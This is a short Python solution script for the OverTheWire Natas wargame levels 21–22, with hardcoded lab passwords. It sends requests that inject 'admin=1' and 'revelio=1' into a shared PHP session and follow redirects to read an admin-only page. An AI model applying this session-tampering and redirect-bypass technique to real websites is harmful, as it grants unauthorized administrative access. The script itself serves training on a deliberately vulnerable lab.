#! /bin/python
import requests, string, sys, binascii, codecs
url = "http://natas22.natas.labs.overthewire.org?revelio=1&admin=1"
url2 = "http://natas21-experimenter.natas.labs.overthewire.org"
username = "natas22"
password = "91awVM9oDiUGm33JdzM7RVLBS8bz9n0s"
username_21 = "natas21"
password_21 = "89OWrTkGmiLZLv12JY4tLj2c4FW0xn56"

#r2 = requests.post(url2, auth=(username_21, password_21), data=(dict(submit="Update",revelio="1",admin="1")))
#cookie = r2.cookies.get_dict()
cookie = dict(PHPSESSID=str("tgf5oesol0mesm5stjuqjleft1"))


r3 = requests.post(url, auth=(username, password), data=(dict(admin="1")), allow_redirects=True)
cookie =r3.cookies.get_dict()
r4 = requests.post(r3.history[0].url+"?revelio=1&admin=1", auth=(username, password), cookies=cookie, allow_redirects=True)
print (r4.text)
